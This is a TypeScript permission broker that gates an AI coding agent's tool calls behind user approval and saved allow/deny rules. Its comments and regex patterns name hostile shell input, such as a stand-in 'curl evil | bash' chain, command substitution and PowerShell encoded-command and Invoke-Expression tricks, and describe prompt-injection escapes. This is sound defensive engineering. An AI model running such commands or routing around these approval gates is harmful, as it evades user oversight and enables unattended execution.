// Permission pipeline — bridges the SDK's canUseTool callback to the
// renderer's inline permission cards, with persisted "always" rules.
//
// Flow per tool call:
//   1. SDK invokes canUseTool(toolName, input, { signal, suggestions, ... })
//   2. Check persisted rules (permission_rules table) — a matching rule
//      short-circuits without asking the renderer
//   3. No rule → emit PERMISSION_REQUEST_EVENT (IPC layer broadcasts
//      `threads:permissionRequest`) and park until the renderer answers via
//      respond(requestId, verdict)
//   4. 'allow-always' verdicts are recorded as rules so the same action is
//      never asked again in this project
//
// FAIL-CLOSED: an aborted/disposed request resolves to deny — a tool call
// never proceeds without an explicit allow from a rule or the user.
//
// SECURITY: inputPreview is sanitized (secret-looking keys redacted,
// truncated) before it crosses to the renderer.

import { EventEmitter } from 'events'
import { randomUUID } from 'crypto'

import type {
  CanUseTool,
  PermissionResult,
  PermissionUpdate,
} from '@anthropic-ai/claude-agent-sdk'

import type { PermissionRequest, PermissionVerdict } from '../../shared/ipc-contract'
import type { FlowDatabase } from '../store/db'
import { FILE_EDIT_TOOLS, isFlowArtifactPathForAny } from './flow-artifacts'
import { MERGE_GUARD_TITLE, isMergeDecisionCommand } from './merge-guard'
import { flowWriteToolTitle, isFlowWriteTool } from './board-tools/board-tools-shared'

/** The built-in tool the agent uses to ask the user a multiple-choice question. */
const ASK_USER_QUESTION_TOOL = 'AskUserQuestion'

/**
 * Resolves whether a project root has a merge / rebase / cherry-pick in
 * progress. Injected by the app wiring (GitManager.getMergeState) so the
 * broker stays free of git knowledge; absent → the merge guard is inert.
 */
export type MergeStateProbe = (projectRoot: string) => Promise<boolean>

/** Emitted when a tool call needs a user verdict. Payload: PermissionRequest. */
export const PERMISSION_REQUEST_EVENT = 'permission-request'

/**
 * Observer invoked for every ALLOWED tool call, awaited BEFORE the allow
 * result is released to the SDK — the edit tracker uses this window to read
 * before-content from disk ahead of the write (ADR-001). Observer failures
 * are logged and never block the tool call.
 */
export type ApprovedToolObserver = (call: {
  threadId: string
  projectRoot: string
  toolName: string
  input: Record<string, unknown>
}) => void | Promise<void>

/** Matches the permission_rules table (created in migration v1). */
export interface PermissionRuleRecord {
  id: string
  projectRoot: string
  toolName: string
  /** Null → rule covers every use of the tool. Else matched against the
   *  tool's primary input (Bash command, file path, URL…): allow rules
   *  require an exact first-token match on an unchained input; deny rules
   *  stay prefix-matched (broader deny is safer). */
  pattern: string | null
  verdict: 'allow' | 'deny'
  createdAt: string
}

interface PermissionRuleRow {
  id: string
  project_root: string
  tool_name: string
  pattern: string | null
  verdict: string
  created_at: string
}

interface PendingPermission {
  request: PermissionRequest
  projectRoot: string
  /** Where an `allow-always` verdict is REMEMBERED — see createCanUseTool. */
  ruleRoot: string
  toolName: string
  /** Original tool input — echoed back as updatedInput on allow (the SDK
   *  Zod-validates allow results and rejects a missing updatedInput). */
  input: Record<string, unknown>
  primaryInput: string | null
  suggestions: PermissionUpdate[] | undefined
  resolve: (result: PermissionResult) => void
  cleanup: () => void
}

/** Cap for the sanitized input excerpt sent to the renderer. */
const INPUT_PREVIEW_MAX_CHARS = 500
/** Input keys whose values are redacted from previews. */
const SECRET_KEY_PATTERN = /key|token|secret|password|credential|auth/i
/**
 * Shell chaining/substitution metacharacters. A command containing any of
 * these NEVER matches a prefix allow rule — approving `ls` must not
 * auto-allow `ls; curl evil | bash` or `ls $(evil)`. Such commands always
 * go to the user.
 */
const SHELL_CHAINING_PATTERN = /[;|&`\n]|\$\(/
/**
 * The same idea in PowerShell's vocabulary, applied ON TOP of the POSIX pattern
 * when the platform is win32 (never on darwin — NFR1: the POSIX branch behaves
 * exactly as it does today, and this is additive and branch-guarded).
 *
 * `;`, `|`, `&`, `&&`, `||` and backtick are already covered above. What is not:
 *  - `@(…)` / `${…}` — PowerShell's other two subexpression forms; only `$(` was
 *    listed, so `@(evil)` slipped through as an ordinary command.
 *  - `$env:` — an environment variable spliced into the command.
 *  - `%VAR%` — the cmd.exe expansion, which survives in a PowerShell session.
 *  - a lone `\r` — a CR-only line break still starts a second command, and the
 *    POSIX pattern only knows `\n`.
 *  - `>` / `<` — redirection. This is the one that matters most here: an
 *    approved `npm` must not silently cover `npm test > ..\..\other\x`, which is
 *    precisely the escape Phase 4 exists to close. POSIX keeps its current
 *    behavior; only Windows tightens.
 *  - `-EncodedCommand` and `Invoke-Expression` — a first token that matches an
 *    allow rule while the real command travels as base64 or as a string.
 */
const POWERSHELL_CHAINING_PATTERN =
  /[\r<>]|\$\{|@\(|\$env:|%[A-Za-z_][A-Za-z0-9_]*%|(?<![-\w])-(?:e|ec|enc|encodedcommand)(?![-\w])|(?<![-\w])(?:iex|Invoke-Expression|Start-Process|New-PSDrive)(?![-\w])/i

/**
 * Renders the inline question picker for an AskUserQuestion tool call and
 * resolves with an `answers` map (keyed by question text) to write onto the tool
 * input, or null when the user made no selection / cancelled.
 */
export type QuestionAsker = (
  threadId: string,
  input: Record<string, unknown>,
  signal: AbortSignal,
) => Promise<Record<string, string> | null>

export class PermissionBroker extends EventEmitter {
  private readonly pending = new Map<string, PendingPermission>()
  private approvedObserver: ApprovedToolObserver | null = null
  private questionAsker: QuestionAsker | null = null
  private mergeStateProbe: MergeStateProbe | null = null

  constructor(private readonly db: FlowDatabase) {
    super()
  }

  /** Attach (or clear) the approved-tool observer — see ApprovedToolObserver. */
  setApprovedToolObserver(observer: ApprovedToolObserver | null): void {
    this.approvedObserver = observer
  }

  /** Attach (or clear) the AskUserQuestion picker — see QuestionAsker. */
  setQuestionAsker(asker: QuestionAsker | null): void {
    this.questionAsker = asker
  }

  /** Attach (or clear) the merge-state probe — see MergeStateProbe (#1135). */
  setMergeStateProbe(probe: MergeStateProbe | null): void {
    this.mergeStateProbe = probe
  }

  /**
   * Whether the merge guard should fire for this call: a Bash command that
   * accepts or completes a conflict resolution, in a root that is actually
   * mid-merge. A probe that throws counts as mid-merge — an unverifiable repo
   * state costs one extra question, never a silent commit (mirrors the
   * conflict gate's "can't verify → keep the gate closed").
   */
  private async guardsMergeDecision(projectRoot: string, toolName: string, command: string | null): Promise<boolean> {
    if (this.mergeStateProbe === null) return false
    if (toolName !== 'Bash' || command === null) return false
    if (!isMergeDecisionCommand(command)) return false
    try {
      return await this.mergeStateProbe(projectRoot)
    } catch (error) {
      console.error('[Permissions] merge-state probe failed:', error)
      return true
    }
  }

  /**
   * Build the SDK canUseTool callback for one thread. The returned callback
   * checks persisted rules first, then parks on a renderer verdict.
   *
   * `ruleRoot` is where saved allow/deny rules are LOOKED UP AND REMEMBERED,
   * and it is the only thing that is not keyed to `roots[0]`. The two parted
   * company when threads got their own worktrees: `roots[0]` became the
   * thread's checkout — right for observation (the diff strip resolves
   * `rootId` + relative path back to a real file) and for the merge probe
   * (the merge is in the checkout the agent works in) — but a rule keyed there
   * would be forgotten with the worktree, so the reader who answered "always
   * allow" once would answer again in every new thread. It defaults to
   * `roots[0]`, which is exactly today's behaviour for a thread without one.
   */
  createCanUseTool(
    threadId: string,
    roots: readonly string[],
    ruleRoot: string = roots[0],
  ): CanUseTool {
    // A multi-project thread (#45) has one PRIMARY root (roots[0]) plus extras.
    // Observation stays keyed to the primary; flow-artifact detection widens to
    // ALL roots; rule scoping follows `ruleRoot` (above).
    const projectRoot = roots[0]
    return async (toolName, input, options) => {
      const primaryInput = extractPrimaryInput(toolName, input)

      // AskUserQuestion arrives through canUseTool in SDK mode (not a permission
      // to grant — it IS the question). Never show a permission card: render the
      // inline question picker, then allow with the user's answers written onto
      // the tool input's `answers` map (the shape the tool reads). No picker /
      // no selection → allow with the original input (the tool reports "no
      // answer"), never blocking the turn.
      if (toolName === ASK_USER_QUESTION_TOOL) {
        let updatedInput: Record<string, unknown> = input
        if (this.questionAsker) {
          try {
            const answers = await this.questionAsker(threadId, input, options.signal)
            if (answers) updatedInput = { ...input, answers }
          } catch (error) {
            console.error('[Permissions] AskUserQuestion picker failed:', error)
          }
        }
        return { behavior: 'allow', updatedInput, toolUseID: options.toolUseID }
      }

      // plan-flow's own flow/ bookkeeping (tasklist, brain, plans…) is auto-
      // written: edits there are allowed silently and never enter diff review.
      // Only real project files reach the rule check / user prompt below.
      if (
        FILE_EDIT_TOOLS.has(toolName) &&
        primaryInput !== null &&
        isFlowArtifactPathForAny(roots, primaryInput)
      ) {
        return { behavior: 'allow', updatedInput: input, toolUseID: options.toolUseID }
      }

      // BOARD WRITES ALWAYS ASK — deliberately ahead of the saved-rule check,
      // exactly like the merge guard below. create/update/start-loop/stop-loop
      // mutate the board or set autonomous runs going, so a standing `allow` rule
      // must NOT let the agent do them unasked. Reads (list/get) are not board
      // writes and fall through. Like every canUseTool gate this is skipped under
      // bypassPermissions — a mode where the user has globally opted out of
      // prompts — which is the same contract the merge guard keeps.
      if (isFlowWriteTool(toolName)) {
        return this.askUser({
          threadId,
          projectRoot,
          ruleRoot,
          toolName,
          input,
          primaryInput,
          signal: options.signal,
          suggestions: options.suggestions,
          toolUseID: options.toolUseID,
          title: flowWriteToolTitle(toolName),
        })
      }

      // MERGE GUARD (#1135) — deliberately ahead of the saved-rule check: while
      // a merge/rebase/cherry-pick is in progress, accepting or completing the
      // resolution is the engineer's decision, so a standing `allow` rule for
      // `git commit` must NOT let the agent finish the merge on its own. Asks
      // every time; outside a conflict state this is inert.
      if (await this.guardsMergeDecision(projectRoot, toolName, primaryInput)) {
        return this.askUser({
          threadId,
          projectRoot,
          ruleRoot,
          toolName,
          input,
          primaryInput,
          signal: options.signal,
          suggestions: options.suggestions,
          toolUseID: options.toolUseID,
          title: MERGE_GUARD_TITLE,
        })
      }

      const rule = this.findMatchingRule(ruleRoot, toolName, primaryInput)
      if (rule) {
        if (rule.verdict !== 'allow') {
          return {
            behavior: 'deny',
            message: `Denied by saved rule for ${toolName}`,
            toolUseID: options.toolUseID,
          }
        }
        // Observation happens BEFORE the allow reaches the SDK (ADR-001:
        // before-content must be read from disk ahead of the write).
        await this.notifyApproved(threadId, projectRoot, toolName, input)
        return { behavior: 'allow', updatedInput: input, toolUseID: options.toolUseID }
      }

      return this.askUser({
        threadId,
        projectRoot,
        ruleRoot,
        toolName,
        input,
        primaryInput,
        signal: options.signal,
        suggestions: options.suggestions,
        toolUseID: options.toolUseID,
        title: options.title,
      })
    }
  }

  /** Renderer verdict for a pending request (threads:respondPermission). */
  respond(requestId: string, verdict: PermissionVerdict): void {
    const pending = this.pending.get(requestId)
    if (!pending) {
      // Already settled (disposed on teardown/abort, or a double-click). A no-op
      // — NOT a throw — so a card still visible after an out-of-band session end
      // resolves cleanly on click instead of wedging in a retry-error dead-end
      // (#96). Mirrors UserDialogBroker.respond.
      return
    }
    this.pending.delete(requestId)
    pending.cleanup()

    if (verdict === 'deny') {
      pending.resolve({ behavior: 'deny', message: 'Denied by user' })
      return
    }

    // A board write always asks (the gate is ahead of the rule check), so an
    // 'always' verdict on one would only write a rule that can never apply —
    // skip it rather than clutter the store with an inert rule.
    if (verdict === 'allow-always' && !isFlowWriteTool(pending.toolName)) {
      this.recordAllowRule(pending.ruleRoot, pending.toolName, pending.primaryInput)
    }

    // The observer (edit tracker before-content capture) must finish before
    // the allow releases the parked tool call — the SDK writes immediately
    // after. notifyApproved never rejects, so the resolve always fires.
    void this
      .notifyApproved(
        pending.request.threadId,
        pending.projectRoot,
        pending.toolName,
        pending.input,
      )
      .then(() => {
        pending.resolve({
          behavior: 'allow',
          updatedInput: pending.input,
          // Pass the SDK's own suggestions through on 'always' so the session
          // layer also stops re-asking, mirroring our persisted rule. NOT for a
          // board write: letting the SDK remember the allow would stop routing
          // future calls through our always-ask gate — the one thing this feature
          // must not let happen.
          ...(verdict === 'allow-always' &&
          pending.suggestions &&
          !isFlowWriteTool(pending.toolName)
            ? { updatedPermissions: pending.suggestions }
            : {}),
        })
      })
  }

  /** Run the approved-tool observer; failures are logged, never propagated. */
  private async notifyApproved(
    threadId: string,
    projectRoot: string,
    toolName: string,
    input: Record<string, unknown>,
  ): Promise<void> {
    if (!this.approvedObserver) return
    try {
      await this.approvedObserver({ threadId, projectRoot, toolName, input })
    } catch (error) {
      console.error('[Permissions] Approved-tool observer failed:', error)
    }
  }

  /** Deny every request still parked for a thread (session ended/crashed). */
  disposeThread(threadId: string): void {
    for (const [requestId, pending] of this.pending) {
      if (pending.request.threadId !== threadId) continue
      this.pending.delete(requestId)
      pending.cleanup()
      pending.resolve({ behavior: 'deny', message: 'Session ended before approval' })
    }
  }

  /** All requests currently awaiting a verdict (renderer re-sync). */
  listPending(): PermissionRequest[] {
    return Array.from(this.pending.values(), (entry) => entry.request)
  }

  // ── Rules ──────────────────────────────────────────────────────────────

  listRules(projectRoot: string): PermissionRuleRecord[] {
    const rows = this.db
      .prepare('SELECT * FROM permission_rules WHERE project_root = ? ORDER BY created_at ASC')
      .all(projectRoot) as PermissionRuleRow[]
    return rows.map(toRuleRecord)
  }

  private findMatchingRule(
    projectRoot: string,
    toolName: string,
    primaryInput: string | null,
  ): PermissionRuleRecord | null {
    const rows = this.db
      .prepare(
        'SELECT * FROM permission_rules WHERE project_root = ? AND tool_name = ? ORDER BY created_at ASC',
      )
      .all(projectRoot, toolName) as PermissionRuleRow[]

    let matched: PermissionRuleRecord | null = null
    for (const row of rows) {
      const rule = toRuleRecord(row)
      // Deny patterns stay prefix-matched (broader deny is safer); allow
      // patterns require an exact first-token match on an unchained command.
      const applies =
        rule.verdict === 'deny'
          ? rule.pattern === null || (primaryInput !== null && primaryInput.startsWith(rule.pattern))
          : allowRuleMatches(toolName, rule.pattern, primaryInput)
      if (!applies) continue
      // Deny rules dominate: any matching deny wins over any allow.
      if (rule.verdict === 'deny') return rule
      matched = rule
    }
    return matched
  }

  private recordAllowRule(
    projectRoot: string,
    toolName: string,
    primaryInput: string | null,
  ): void {
    // Scope the 'always' rule so it can't over-reach: Bash → first token,
    // file/URL tools → the exact resource. A tool-wide (null) rule is recorded
    // only when the tool has no resource input to scope to (#239).
    const pattern = allowRulePattern(toolName, primaryInput)
    this.db
      .prepare(
        `INSERT INTO permission_rules (id, project_root, tool_name, pattern, verdict, created_at)
         VALUES (?, ?, ?, ?, 'allow', ?)
         ON CONFLICT(project_root, tool_name, pattern) DO NOTHING`,
      )
      .run(randomUUID(), projectRoot, toolName, pattern, new Date().toISOString())
  }

  // ── Parked requests ────────────────────────────────────────────────────

  private askUser(params: {
    threadId: string
    projectRoot: string
    ruleRoot: string
    toolName: string
    input: Record<string, unknown>
    primaryInput: string | null
    signal: AbortSignal
    suggestions: PermissionUpdate[] | undefined
    toolUseID: string
    title: string | undefined
  }): Promise<PermissionResult> {
    // LOG-7: an already-aborted signal never fires 'abort' again — parking
    // here would leak the request and hang the tool call. Deny immediately.
    if (params.signal.aborted) {
      return Promise.resolve({ behavior: 'deny', message: 'Interrupted before approval' })
    }

    const request: PermissionRequest = {
      requestId: randomUUID(),
      threadId: params.threadId,
      toolName: params.toolName,
      summary: params.title ?? `Agent wants to use ${params.toolName}`,
      inputPreview: sanitizeInputPreview(params.input),
    }

    return new Promise<PermissionResult>((resolve) => {
      const onAbort = (): void => {
        this.pending.delete(request.requestId)
        resolve({ behavior: 'deny', message: 'Interrupted before approval' })
      }
      params.signal.addEventListener('abort', onAbort, { once: true })

      this.pending.set(request.requestId, {
        request,
        projectRoot: params.projectRoot,
        ruleRoot: params.ruleRoot,
        toolName: params.toolName,
        input: params.input,
        primaryInput: params.primaryInput,
        suggestions: params.suggestions,
        resolve,
        cleanup: () => params.signal.removeEventListener('abort', onAbort),
      })

      this.emit(PERMISSION_REQUEST_EVENT, request)
    })
  }
}

/** The single string a rule pattern is matched against, per tool. */
function extractPrimaryInput(
  toolName: string,
  input: Record<string, unknown>,
): string | null {
  const candidate =
    toolName === 'Bash'
      ? input['command']
      : (input['file_path'] ?? input['url'] ?? input['path'])
  return typeof candidate === 'string' ? candidate : null
}

function firstToken(command: string | null): string | null {
  if (!command) return null
  const token = command.trim().split(/\s+/)[0]
  return token && token.length > 0 ? token : null
}

/**
 * SEC-1: a prefix ALLOW rule matches only when the rule pattern equals the
 * input's exact first token AND the input carries no shell chaining or
 * substitution — `startsWith` would let an approved `ls` cover `lsof` and
 * `ls; curl evil | bash` (prompt-injection → unattended command execution).
 */
function allowPatternMatches(
  pattern: string,
  primaryInput: string | null,
  platform: NodeJS.Platform | string,
): boolean {
  if (primaryInput === null) return false
  if (SHELL_CHAINING_PATTERN.test(primaryInput)) return false
  if (platform === 'win32' && POWERSHELL_CHAINING_PATTERN.test(primaryInput)) return false
  return firstToken(primaryInput) === pattern
}

/**
 * The pattern an 'Always allow' records, scoped so the grant can't over-reach
 * (#239). Bash → the command's first token (SEC-1). Any other tool with a
 * concrete resource input (Write/Edit/MultiEdit file_path, WebFetch url, …) →
 * that exact path/url, so approving one write doesn't blanket-approve every
 * future write. Only a tool with no resource input (primaryInput null) gets a
 * tool-wide rule, since there is no finer scope to record.
 */
export function allowRulePattern(toolName: string, primaryInput: string | null): string | null {
  if (toolName === 'Bash') return firstToken(primaryInput) ?? primaryInput
  return primaryInput
}

/**
 * Whether a recorded ALLOW rule matches the current call. Bash keeps first-token
 * SEC-1 semantics; every other tool matches its scoped resource EXACTLY, so a
 * `Write` allow for one file never covers another (and a spaced path can't be
 * partially matched via first-token). A null pattern (tool-wide) still matches.
 */
export function allowRuleMatches(
  toolName: string,
  pattern: string | null,
  primaryInput: string | null,
  platform: NodeJS.Platform | string = process.platform,
): boolean {
  if (pattern === null) return true
  if (toolName === 'Bash') return allowPatternMatches(pattern, primaryInput, platform)
  return primaryInput !== null && primaryInput === pattern
}

/** Redact secret-looking values, then truncate for the permission card. */
function sanitizeInputPreview(input: Record<string, unknown>): string {
  const sanitized: Record<string, unknown> = {}
  for (const [key, value] of Object.entries(input)) {
    sanitized[key] = SECRET_KEY_PATTERN.test(key) ? '[redacted]' : value
  }
  let preview: string
  try {
    preview = JSON.stringify(sanitized)
  } catch {
    preview = '[unserializable input]'
  }
  return preview.length > INPUT_PREVIEW_MAX_CHARS
    ? `${preview.slice(0, INPUT_PREVIEW_MAX_CHARS)}…`
    : preview
}

function toRuleRecord(row: PermissionRuleRow): PermissionRuleRecord {
  return {
    id: row.id,
    projectRoot: row.project_root,
    toolName: row.tool_name,
    pattern: row.pattern,
    verdict: row.verdict as 'allow' | 'deny',
    createdAt: row.created_at,
  }
}
